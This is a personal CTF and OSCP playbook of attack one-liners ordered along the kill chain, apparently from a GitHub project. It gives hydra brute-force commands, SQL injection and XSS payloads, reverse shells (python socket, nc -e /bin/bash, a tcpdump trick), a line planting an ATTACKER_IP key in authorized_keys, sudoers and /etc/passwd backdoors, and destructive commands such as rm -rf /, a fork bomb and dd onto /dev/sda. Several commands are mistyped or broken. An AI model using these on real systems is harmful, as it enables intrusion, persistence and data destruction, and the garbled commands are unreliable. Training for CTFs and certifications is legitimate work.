![](/images/ctf-playbook.png)

# CTF Playbook Instructions
CTF playbook is my personal playbook for enumeration and attack techniques. The techniques here are meant to be loud and clumsy. No fancy obfuscation here, just smash and grab the flag. Most techniques here are bash one-liners. Ultimately, they will be looped into larger bash scripts. This playbook will also be used as a jump-off point for the OSCP exam.

The playbook will loosely follow Lockheed Martin's [Cyber Kill Chain](https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html). It is currently linux/unix focused, with plans to expand in the future.The playbook will differentiate plays but *theme*. The two current themes are __Low and Slow__ and __Move Fast and Break Things__

Start enumerating your target with plays in the playbook. Plays are grouped into categories called playsets. When you've successfully completed a playset, you can select the arrow image to be taken to the next link in the kill chain. This process often has iterations in a loop. Use the previous play icon to return to a playset when you've upgraded access credentials or visibility.

Next Play Icon:

![Alt text](/images/ctf-playbook-icon.png "Play Icon")

Previous Play Icon: 

![Alt text](/images/ctf-back-button.png "Previous Play")


# Index and Playsets
- [CTF Playbook Instructions](#ctf-playbook-instructions)
- [Index and Playsets](#index-and-playsets)
- [Reconnaissance 1](#reconnaissance-1)
  - [Scan Network For Targets](#scan-network-for-targets)
- [Reconnaissance 2](#reconnaissance-2)
  - [Simple Port Scanning Enumeration](#simple-port-scanning-enumeration)
  - [Automated Port Scanning](#automated-port-scanning)
  - [Port Scanning Scripts](#port-scanning-scripts)
  - [Network Scanning](#network-scanning)
  - [Vulnerability Scanning](#vulnerability-scanning)
- [Reconnaissance 3](#reconnaissance-3)
  - [Web Application Attack](#web-application-attack)
    - [Cross Site Scripting (XSS)](#cross-site-scripting-xss)
    - [SQL Injection](#sql-injection)
    - [XPath Injection](#xpath-injection)
    - [Local File Exclusion](#local-file-exclusion)
    - [Remote File Inclusion](#remote-file-inclusion)
  - [Port 20 FTP](#port-20-ftp)
  - [Port 21 FTP](#port-21-ftp)
  - [Port 22 SSH](#port-22-ssh)
  - [Port 23 Telnet](#port-23-telnet)
  - [Port 25 SMTP](#port-25-smtp)
  - [Port 43 WHOIS](#port-43-whois)
  - [Port 53 DNS](#port-53-dns)
  - [Port 67, 68 BOOT,DHCP](#port-67-68-bootdhcp)
  - [Port 79 Finger](#port-79-finger)
  - [Port 80 HTTP](#port-80-http)
  - [Moving Fast and Breaking Things](#moving-fast-and-breaking-things)
- [Weaponization](#weaponization)
  - [Brute Force Services](#brute-force-services)
  - [Malicous File Upload](#malicous-file-upload)
- [Delivery](#delivery)
  - [Transfer Files with TFTP](#transfer-files-with-tftp)
  - [Transfer Files with FTP](#transfer-files-with-ftp)
  - [Set up a Webserver to Share files,exploits](#set-up-a-webserver-to-share-filesexploits)
  - [Upload Maliscous File](#upload-maliscous-file)
- [Exploitation](#exploitation)
  - [Reconnaissance 4](#reconnaissance-4)
- [Command and GitTroll (CG2)](#command-and-gittroll-cg2)
- [Priviledge Escalation](#priviledge-escalation)
  - [Kicking the Tires](#kicking-the-tires)
  - [Automated Priv Escalation Scripts](#automated-priv-escalation-scripts)
  - [If You have a Reverse Shell...](#if-you-have-a-reverse-shell)
  - [Metasploit](#metasploit)
  - [Python Scripts](#python-scripts)
- [Actions on Objectives](#actions-on-objectives)
  - [Search for Flags](#search-for-flags)
- [Celebration](#celebration)
- [Non Necessities](#non-necessities)
- [Documentation](#documentation)
- [Credit and Resources](#credit-and-resources)
- [Resources](#resources)
  - [Videos](#videos)
  - [Github](#github)
- [General Unix Commands](#general-unix-commands)
  - [Netcat](#netcat)
- [General Windows CMD Commands](#general-windows-cmd-commands)
- [OSCP Specefic Commands](#oscp-specefic-commands)
- [OSINT and Passive Information Gathering](#osint-and-passive-information-gathering)


# Reconnaissance 1 
Locate and identify live targets on the network 
[![Alt text](/images/ctf-playbook-icon.png "Play Icon")](#reconnaissance-2)  

## Scan Network For Targets
``` bash
# Use ARP protocol to find machines on the network
arp-scan -I [interface] -l
# Perform a ping sweep for live hosts
1) nmap -v -sn [CIDR range of network] -oG sweep.txt
2) grep "Status Up" sweep.txt | cut -d" " -f 2
# use netdiscover to find live hosts
netdiscover -i [interface] -p
nmap -sP [target/CIDR Range]
```
# Reconnaissance 2  
Conduct network and service enumeration on targets
[![Alt text](/images/ctf-playbook-icon.png "Play Icon")](#reconnaissance-3)  

## Simple Port Scanning Enumeration
``` bash 
# Quick Nmap Scan
nmap -T 5 [target]
# Nmap scan for service version and OS fingerprinting 
nmap -sV -O -A [target]
# Nmap scan for service version and OS fingerprinting, banner grabbing,  all ports
nmap -sV -O -A -sT -p- [target]
# Nmap for UDP ports
nmap -sU [target]
# Nmap for all UDP ports {!}Warning, this is slow
nmap -sU -p- [target]
# Nmap NSE scripting enginge for nbt service
nmap -sU --script nbstat.nse -p 137 [target]
```
## Automated Port Scanning  
Port Scanning can be automated with the following tools  
+ [Sparta](https://tools.kali.org/information-gathering/sparta): Add your targets to the scope and run scans. Sparta will generate port and service enumeration, as well as web service enumeration with Nikto. Pass along services to Brute to attempt brute force attacks  
+ [OpenVas](https://tools.kali.org/vulnerability-analysis/openvas): An open source vulnerability scanner
+ [Nessus](https://www.tenable.com/blog/getting-started-with-nessus-on-kali-linux):

## Port Scanning Scripts  
```bash
# Manually check port with ncat
nc -nv [target] [port]

# custom little bash script for ping sweeping 

#!/bin/bash
# usage ./arpsweep 192.168 [interface: I.E eth1]
PREFIX=$1
INTERFACE=$2
for SUBNET in {1..255}
do
    for HOST in {1..255}
    do
        echo "[*] IP: "$PREFIX". "$SUBNET"."$HOST
        arping -c 3 -i $INTERFACE $PREFIX"."$SUBNET"."$HOST 2>
        /dev/null
        done
    done 
```

## Network Scanning  
``` bash
# use tcpdump to gather network traffic 
tcpdump net [target CIDR range]
tcpdump [interface]
tcpdump port [port]
```

## Vulnerability Scanning  
``` bash
# Search for public exploits
searchsploit [any term (service, version, ect)]
# Vulnerability Scanning with Nmap

#

# Using Nmap NSE scripting engine
# Scan target for SMB vulns
nmap [target] --script smb-os-discovery.nse
nmap -sc [target]
nmap --script discovery
nmap -sC vuln
nmap --script exploit
nmap --script "[port]-*" [target]
nmap --script-args=unsafe=1 --script smb-check-vulns.nse -p 445 [target]
nmap -p80,443 [Target or CIDR] -oG - | nikto.pl -h -

msfconsole
openvas 

enum4linux -a [target]

ike-scan [target]
```

# Reconnaissance 3 
Digging deeper into particular services, and running massive vulnerability scans. 
[![Alt text](/images/ctf-playbook-icon.png "Play Icon")](#weaponization) [![Alt text](/images/ctf-back-button.png "Previous Play")](#reconnaissance-2)  
  
## Web Application Attack  
### Cross Site Scripting (XSS)
```bash
# Enter this into a web form to check for XSS vuln
<script>alert("XSS")</script>
```  
### SQL Injection    
[OWASP SQL Injection Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)  
[Bug Bounty XSS CheatSheet](https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xss.md)
```bash
# Enter to a login page to check for SQL inj
username: ' or '1' = '1'
password: ' or '1' = '1' 

# run sql map on an injectable site 
sqlmap -u "domain" --dump
# use sqlmap to gain a remote shell
sqlmap -u "domain" --os-shell

```  
### XPath Injection  
```bash

```
### Local File Exclusion  
```bash

```
### Remote File Inclusion  
```bash

```  

For a list of TCP and UDP ports and their common services, visit this [Wikipedia Page](https://en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers)

## Port 20 FTP  
## Port 21 FTP  
```bash
# check for ftp vuln
nmap -v -p 21 --script=ftp-anon.nse [target]
```
## Port 22 SSH  
## Port 23 Telnet  
## Port 25 SMTP  
```bash
# interact with SMTP using ncat
nc -nv [target] 25
```
## Port 43 WHOIS  
## Port 53 DNS  
```bash
# use nmap to attempt zone transfer
nmap --script=dns-zone-transfer -p 53 [domain server]
```
## Port 67, 68 BOOT,DHCP  
## Port 79 Finger  
## Port 80 HTTP  
``` bash
firefox [target]
firefox [target]/robots.txt
dirb http://[target]
nikto -h [target]

arachni -u [URL]

# DNS enumeration 
dig [target domain]
whois [target domain]
dnsmap [target domain]

# testing for XSS
# In a website form enter 
<script>alert(1)</script>

## Moving Fast and Breaking Things

# make output directory for skipfish
mkdir skipfish-output
# get sample list 
cp /use/share/skipfish/dictionaries/medium.w1
# remove line "ro"
skipfish -W medium -o skipfish-output
```  
__Port 88 Kerberos__  
__Port 101 NIC host name__  
__Port 102 ISO__  
__Port 107 RTelnet__  
__Port 111 ONC RPC__  
__Port 113 IRC, AUTH__  
__Port 115 SFTP__  
__Port 118 SQL__  
__Port 137 NetBIOS__  
__Port 139, 445 SMB__  
```bash
# use nmap to scan for netbios service
nmap -v -p 139,445 -oG smb.txt [target]
# use nmap script for host discvovery
nmap -v -p 139, 445 --script=smb-os-discovery [target]
# List nmap smb nse scripts
ls -l /usr/share/nmap/scripts/smb*
# check for common smb vuln
nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 [target]
# use nbtscan
nbtscan -r [target]
# use enum4linux to check for null session
enum4linux -a [target]
```
__Port 143 IMAP__  
__Port 161 SNMP__  
```bash
# scan for open SNMP port
nmap -sU --open -p 161 [target] -oG mega-snmp.txt
# use onesixty one 
echo public > community
echo private >> community
echo manager >> community
for ip in $(seq 1 254);do echo 10.11.1.$ip;done > ips
onesixtyone -c community -i ips
# use snmp walk 
snmpwalk -c public -v1 [target]
```
__Port 443 HTTPS__  
__Port 445 Active Directory__  
__Port 464 Kerberos__  
__Port 513 rlogin__  
__Port 514 Remote Shell__  
__Port 530 RPC__  
__Port 587 SMTP__  


__NBT,SMB,SNMP Scan__
```bash
nbtscan -l [target]

smbclient -L //[target]

msfcli auxiliary/scanner/snmp/snmp_login RHOSTS=[target]
```

## Moving Fast and Breaking Things  
```bash 
#!/bin/bash
for ip in nmap -v -T5 -p[port] [host] | awk -F\
'/[PORT]\/[tcp | udp] on/ {print $6}'`
do
    msfcli [MODULE] RHOST=$ip E;
done 
```

# Weaponization 
Turn recon into actionable exploits
[![Alt text](/images/ctf-playbook-icon.png "Play Icon")](#delivery)

## Brute Force Services  
```bash
hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 
[target] [service] -V
#Hydra brute force against SNMP
hydra -P password-file.txt -v $ip snmp
#Hydra FTP known user and password list
hydra -t 1 -l admin -P /root/Desktop/password.lst -vV $ip ftp
#Hydra SSH using list of users and passwords
hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh
#Hydra SSH using a known password and a username list
hydra -v -V -u -L users.txt -p "<known password>" -t 1 -u $ip ssh
#Hydra SSH Against Known username on port 22
hydra $ip -s 22 ssh -l <user> -P big\_wordlist.txt
#Hydra POP3 Brute Force
hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V
#Hydra SMTP Brute Force
hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V
#Hydra attack http get 401 login with a dictionary
hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin
#Hydra attack Windows Remote Desktop with rockyou
hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip
#Hydra brute force a Wordpress admin login
hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
```

## Malicous File Upload  
```bash
# location of kali linux malicious web shells 
cd /user/share/webshells/
```

* test common services pop3,ftp,ssh, smtp

```

+  __Metasploit__:
    +    __Select Exploit__: $ use [exploit]
    +    __See Options__: $ show options
    +    __Set Options__: $ set [option name] [option value]
    +    __Run Exploit__: $ run
    +    __Check for session__: $ session -ls
```

# Delivery 
Deliver payload to the target, transfer files between target and attack machine.
[![Alt text](/images/ctf-playbook-icon.png "Play Icon")](#exploitation)  

## Transfer Files with TFTP  
```bash
# Start  atftpd setvice
sudo service atftpd start
atftpd --daemon --port 69 /tftp
# Add your files to the service
echo 'your information' >> /srv/tftp/filename.extension

# Retreive file on target machine
tftp [attack ip] GET filename.extension

```

## Transfer Files with FTP  
```bash
# Set up an FTP server in Kali
root@kali: $ mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /file/you/want/to/share.extension /tftp/

target@target: $ tftp -i [attack ip]get [file.extension]
```

## Set up a Webserver to Share files,exploits  
```bash
# Set up web server in kali
# run web server
service apache2 start 
# navigate to folder 
cd /var/www/html
# place files in folder 
nano file.extension
cp /path/to/file /name.extension
# download file from target machine 
target@target: $wget http://[attack ip]/file.extension
```

## Upload Maliscous File  
```bash
# Use the following techniques to upload malfiles such as php reverse shells

# Upload via HTTP
# Start a local web server
service apache2 start 
# change directories to webserver 
cd /var/www/html
# download files to webserver 
wget https://some-website.com/path/to/file
# download files from your webserver to your target 
target$ wget [attack-machine-ip]/filename.extension

# Upload via FTP
# Upload via TFTP
# Upload via SMB
# Upload via SSH / SCP
```

# Exploitation 
Successful gain unauthorized access
[![Alt text](/images/ctf-playbook-icon.png "Play Icon")](#reconnaissance-4).  This step depends entirely on what type of exploit you decide to use. 

## Reconnaissance 4  
Gather additional information previously unattainable. Some of these will overlap with renumeration rechniques described in the [Priv Escalation Playset](#priviledge-escalation)
[![Alt text](/images/ctf-playbook-icon.png "Play Icon")](#command-and-gittroll-(cg2)) [![Alt text](/images/ctf-back-button.png "Previous Play")](#reconnaissance-2)


``` bash
# Find the last commands run
$ history 
$ netstat -ano
$ strings [filename.extension]
$ file [filename.extension]
$ ps aux
$ who
# Find the Kernel Version
$ uname -a 
$ printenv
# Find versions of executatbles 
$ /path/to/file -version
# exploit outdated nmap version
$ /usr/local/bin/nmap --interactive
$ !sh
$ whoami

$ netstat -natup
$ ps aux | grep root
$ sudo -l
$ sudo su -l
$ lsb_release -a
$ cat /etc/issue; cat /etc/*-release; cat /etc/lsb-release; cat /etc/redhat-release;
$ cat /proc/version; uname -a; uname -mrs; rpm -q kernel; dmesg | grep Linux; ls /boot | grep vmlinuz-; file /bin/ls; cat /etc/lsb-release
$ cat /etc/profile; cat /etc/bashrc; cat ~/.bash_profile; cat ~/.bashrc; cat ~/.bash_logout; env; set
$ mount; df -h; cat /etc/fstab

# Look at user permissions 
$ ls -l

# Find other Users
 $id; who; w; last; cat /etc/passwd | cut -d: -f1; echo 'sudoers:'; cat /etc/sudoers; sudo -l

# World Readable / Writable Files 
$ echo "world-writeable folders"; find / -writable -type d 2>/dev/null; echo "world-writeable folders"; find / -perm -222 -type d 2>/dev/null; echo "world-writeable folders"; find / -perm -o w -type d 2>/dev/null; echo "world-executable folders"; find / -perm -o x -type d 2>/dev/null; echo "world-writeable & executable folders"; find / \( -perm -o w -perm -o x \) -type d 2>/dev/null;

# Inspect web traffice
$ tcpdump tcp port 80 -w output.pcap -i eth0


# look at cronjobs that runs as root with incorrect permissions
```

# Command and GitTroll (CG2) 
Establish a lasting backdoor 
[![Alt text](/images/ctf-playbook-icon.png "Play Icon")](#priviledge-escalation)  

If you really wanted to test this ability. You can use [Merlin](https://github.com/Ne0nd0g/merlin). This is out of scope for boot to root CTF competitions, but has some potential functionality in larger format events.

# Priviledge Escalation 
Escalate to root  . [See Credit](#credit-and-resources)
[![Alt text](/images/ctf-playbook-icon.png "Play Icon")](#actions-on-objectives)  

## Kicking the Tires  
```bash
# Manual sudo to root
$ sudo su -
$ sudo -l
# Get OS and Kernel Version, look for public exploits
$ lsb_release -a
$ uname -a 
$ searchsploit [OS] or [Kernel]
echo root::0:0:root:/root:/bin/bash > /etc/passwd

#See which processes are running with root priv
ps aux | grep root
# Check for SUID files in the sytem
$ find / -perm -u=s -type f 2>/dev/null

stat /etc/passwd

find / -writeable > writeable-files.txt

#Add user www-data to sudoers with no password
$ echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```

## Automated Priv Escalation  Scripts  
Download these scripts to your target and run to search for any number of vulnerabilities  
```bash
# The best script I've found by far 
wget  https://github.com/mzet-/linux-exploit-suggester/blob/master/linux-exploit-suggester.sh

wget https://github.com/pentestmonkey/unix-privesc-check

```

## If You have a Reverse Shell...
```bash
#Get a TTY shell after a reverse shell connection
python -c 'import pty;pty.spawn("/bin/bash")'
#Set PATH TERM and SHELL if missing:
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
export TERM=xterm
export SHELL=bash
# Above but as one script 
python -c 'import pty;pty.spawn("/bin/bash")'; export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
; export TERM=xterm; export SHELL=bash

#Add public key to authorized keys:
$ echo $(wget https://ATTACKER_IP/.ssh/id_rsa.pub) >> ~/.ssh/authorized_keys

#Some payloads to overcome limited shells:
$ ssh user@$ip nc $localip 4444 -e /bin/sh
    enter user's password
$ python -c 'import pty; pty.spawn("/bin/sh")'
$ export TERM=linux

$ python -c 'import pty; pty.spawn("/bin/sh")'

$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("$ip",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),   *$ 1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

$ echo os.system('/bin/bash')

$ /bin/sh -i

$ exec "/bin/sh";

$ perl —e 'exec "/bin/sh";'

#From within tcpdump
$ echo $’id\n/bin/netcat $ip 443 -e /bin/bash’ > /tmp/.test
chmod +x /tmp/.test
sudo tcpdump -ln -I eth- -w /dev/null -W 1 -G 1 -z /tmp/.tst -Z root

```
__Exploiting Services__
```bash
#MySQL
sys_exec('usermod -a -G admin username')

```
## Metasploit  
If you have a meterpreter shell
``` bash
# escalate to root
getsystem
# get system information
sysinfo
# find network interfaces
netstat
# drop into a shell
shell

```
## Python Scripts  
```python
# Add sudoers
#!/usr/bin/env python
import os
import sys
try:
        os.system('echo "username ALL=(ALL:ALL) ALL" >> /etc/sudoers')
except:
        sys.exit()
```
# Actions on Objectives 
Our object is to collect all the flags, and gain root compromise. Gather necessary CTF documentation (flags)
[![Alt text](/images/ctf-playbook-icon.png "Play Icon")](#celebration)  

## Search for Flags  
``` bash
find "*flag*"
find "*FLAG*"
find "*FLAG.txt*"
find -03 -L /var/www/ -name "*flag*"

find . -type f -exec grep "*flag*" '{}' \; -print

locate *flag*

# If you've found a flag and calculated size
find / -size -[flag size] 

locate "*flag*"
ls -alSh

# locate "hidden" files 
ls -a 
```

# Celebration 
Add your mark
[![Alt text](/images/ctf-playbook-icon.png "Play Icon")](#documentation)

A quick list of resources for celebrating your CTF root
1.  Overwrite your victory website to CTF web server  

```bash
# Example, fork the template to make your own victory site
git clone https://github.com/tcbutler320/ctf-playbook/tree/master/victory-mark

rm -r /var/www
cp victory-mark /var/www/

```  
2.  Trash the box, !VERY dangerous, you've been warned. Research has not been done to determine if trashing a VM on your local host will effect your local host. [#trashthebox](https://www.tecmint.com/10-most-dangerous-commands-you-should-never-execute-on-linux/)
```bash
# Carnage (don't run this on anything you care about, you've been warned)
$ rm -rf /
$ :(){:|:&};:
$ command > /dev/sda
$ mv /home/user/* /dev/null
$ dd if=/dev/random of=/dev/sda 

```
# Non Necessities
This section will contain more pentest-related scripts and scans that are not likely to be used during a CTF

__Disguises__
``` bash 
# change your mac address
ifconfig down [interface: I.E eth0]
macchanger -r
ifconfig up [interface]

# arpspoof your address
arpspoof -t [target ip] [gateway ip]

```


# Documentation
Documentation is important, as you will need to come back frequently to things you've found. 

+  __CherryTree__: $
+  __KeepNote__: $
+  __TextPad__: $

# Credit and Resources
There are countless resources and people who deserve credit for their contributions to this playbook. 

+  Credit and Resources  
    -    [CheatSheet God](https://github.com/OlivierLaflamme/Cheatsheet-God/blob/master/Cheatsheet_PenTesting.txt)
    -    [Adam P](https://github.com/adam-p/markdown-here/raw/master/src/common/images/icon48.png) : Logo
    -    [Guif: Priv Escalation](https://guif.re/linuxeops): One of the best resources I've found for raw scripts on Priv Esc. Thanks!
    -    [Total OSCP Guide](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html)

# Resources 
+ [Metasploit Persistence](https://www.darkoperator.com/blog/2009/12/31/meterpreter-persistance.html)
+ [Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+ [Post Exploitation on Windows Machines](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=2ahUKEwjkx4zftO3kAhVHwlkKHbu4ByAQFjAAegQIABAC&url=https%3A%2F%2Fwww.exploit-db.com%2Fdocs%2Fenglish%2F26000-windows-meterpreterless-post-exploitation.pdf&usg=AOvVaw3sDjaSPC-wL1miL2N-RblW)


## Videos
+  [SUID and GSID](https://www.youtube.com/watch?v=DF1-XRUo6OE)

## Github

# General Unix Commands

```bash
# list processes
ps aux
ps aux | grep [keyword]
top
# start ssh service
systemctl enable ssh
systemctl start ssh
service ssh start
#start web server
systemctl enable apache2
service apache2 start

# check if a service is running 
netstat -antp|grep [service]

# download web page 
wget http://name.domain.com

# move a file 
mv filename.extension /path/to/new/place

# reading files
head [file]
tail [file]
nano [file]
cat [file]

# monitor your network traffic 
iptables -I INPUT 1 -s [target] -j ACCEPT
iptables -I OUTPUT 1 -d [target] -j ACCEPT
iptables -Z
```

## Netcat 
```bash
# connect to a targt port 
nc -nc [target ip] [port]
# listen on a port 
nc -nlvp [port]
# redirect input to file
nc -nc [target ip] [port] >  [filename.extension]
# bind a shell to a port (windows)
nc -nlvp [port] -e cmd.exe
# bind a shell to a port (linux)
nc -nlvp [port] -e /bin/bash
# send a reverse shell (linux)
nc -nc [target] [port] -e cmd.exe
# send a reverse shell (linux)
nc -nc [target] [port] -e /bin/bash
```

# General Windows CMD Commands
```windows cmd
# search for running services
c:\user> netstat -an|find "[port]"
```

# OSCP Specefic Commands 

```bash
locate network-secret.txt
locate proof.txt
```

# OSINT and Passive Information Gathering 








[logo]: https://github.com/adam-p/markdown-here/raw/master/src/common/images/icon48.png "Next Play" 
